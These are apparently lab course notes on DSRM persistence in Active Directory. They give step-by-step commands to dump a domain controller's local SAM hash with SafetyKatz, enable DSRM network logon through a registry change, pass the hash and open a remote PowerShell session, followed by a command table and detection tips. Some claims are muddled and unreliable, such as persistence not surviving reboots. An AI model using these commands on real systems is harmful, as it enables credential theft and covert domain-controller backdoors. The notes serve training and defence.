# Persistence — DSRM (Directory Services Restore Mode)

**Date:** 04 August 2026


---

## What is DSRM?

**DSRM = Directory Services Restore Mode**

- Recovery mode for Domain Controllers
- Every DC has a local Administrator account
- This account uses DSRM password (set during DC promotion)
- Rarely changed (set once, forgotten)
- Perfect persistence backdoor

---

## DSRM Administrator Account

**Key Facts:**
- Local admin on DC (not domain account)
- Separate password from domain Administrator
- Set during server promotion to DC
- Rarely modified (typically only once)
- Can be used for pass-the-hash attacks

**Why It's Valuable:**
- Bypasses domain restrictions
- Direct local access to DC
- Not monitored like domain accounts
- Persistence survives domain password changes

---

## Step 1: Dump DSRM Password Hash

**Extract Administrator hash from SAM:**

```powershell
SafetyKatz.exe "token::elevate" "lsadump::sam"
```

**Parameters:**
- `token::elevate` — Elevate privileges
- `lsadump::sam` — Dump SAM hive (local credentials)

**Output:** Local Administrator NTLM hash (DSRM account)

---

## Step 2: Compare Hashes

**Extract domain Administrator hash:**

```powershell
SafetyKatz.exe "lsadump::lsa /patch"
```

**Compare Output:**
```
SAM dump Administrator:  a102ad5753f4c441e3af31c97fad86fd  (DSRM Local Admin)
LSA dump Administrator:  c39f2beb3d64... (Domain Administrator)
```

**They are different!** SAM is DSRM local admin.

---

## Step 3: Enable DSRM Logon Behavior

**By default, DSRM account cannot log in remotely.**

Enable it:

```powershell
winrs -r:dcorp-dc cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

**Registry Key:**
- `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`
- Value `2` = Allow DSRM admin logon (without domain)

---

## Step 4: Pass-the-Hash Attack

**Use DSRM Administrator hash to get shell:**

```powershell
SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"
```

**Parameters:**
- `/domain:dcorp-dc` — DC name (not domain)
- `/user:Administrator` — DSRM Administrator
- `/ntlm` — NTLM hash (from SAM dump)
- `/run:powershell.exe` — Execute PowerShell with these credentials

**Result:** New PowerShell session with DSRM Admin privileges.

---

## Step 5: Trust DC Host

```powershell
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
```

Add DC IP to trusted hosts (allows WinRM connection).

---

## Step 6: Remote Access to DC

```powershell
Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```

**Parameters:**
- `-ComputerName` — DC IP address
- `-Authentication NegotiateWithImplicitCredential` — Use credentials from current session (PTH session)

**Result:** Remote access to DC as DSRM Administrator.

---

## Attack Flow

```
1. Dump DSRM hash from SAM
   ↓
2. Verify it's different from domain admin hash
   ↓
3. Enable DSRM logon behavior (registry)
   ↓
4. Pass-the-hash of DSRM admin
   ↓
5. Trust DC in WSMan
   ↓
6. Remote access to DC
```

---

## Why DSRM is Effective

✅ **Local account** — bypasses domain restrictions  
✅ **Rarely changed** — stable persistence  
✅ **Not monitored** — often forgotten  
✅ **Direct DC access** — full system compromise  
✅ **Survives domain resets** — independent of AD  

---

## Why DSRM is Dangerous

❌ **Requires DA privileges** — to extract hash  
❌ **Registry change needed** — to enable logon  
❌ **Not persistent across reboots** — unless hash leaked  
❌ **Can be detected** — registry change audited  
❌ **Known technique** — widely defended against  

---

## Detection & Prevention

**Detection:**
- Monitor `DsrmAdminLogonBehavior` registry changes
- Alert on DSRM logon attempts
- Track SAM dump attempts (token::elevate + lsadump::sam)
- Monitor WinRM connections to DC

**Prevention:**
- Change DSRM password regularly (impossible in practice)
- Disable DSRM logon capability
- Monitor local admin account usage
- Use hardware tokens for DC access

---

## DSRM vs Other Persistence

| Technique | Duration | Scope | Detection Risk |
|---|---|---|---|
| DSRM | Indefinite | DC only | Medium |
| Golden Ticket | 10+ hours | Domain | Low (with evasion) |
| Skeleton Key | Until reboot | DC only | High |
| Forged cert | Indefinite | Domain | Low |
| Backdoor account | Indefinite | Domain | Medium |

---

## Command Reference

| Task | Command |
|---|---|
| Dump DSRM hash | `SafetyKatz.exe "token::elevate" "lsadump::sam"` |
| Dump domain admin hash | `SafetyKatz.exe "lsadump::lsa /patch"` |
| Enable logon behavior | `reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f` |
| Pass-the-hash | `SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<hash> /run:powershell.exe"` |
| Trust DC | `Set-Item WSMan:\localhost\Client\TrustedHosts <ip>` |
| Connect to DC | `Enter-PSSession -ComputerName <ip> -Authentication NegotiateWithImplicitCredential` |

---

## Key Takeaway

```
DSRM = Forgotten local admin account on DC
Rarely changed password = Easy persistence
Requires DA to extract, but lasts forever
Best for long-term backdoor access
```

---

## References

- [SafetyKatz](https://github.com/GhostPack/SafetyKatz)
- [DSRM Persistence (Microsoft)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-restoring-a-single-domain-in-a-multidomain-forest)

---

*Next: Learning Objective 11 — Cross-Forest Attacks & Persistence*
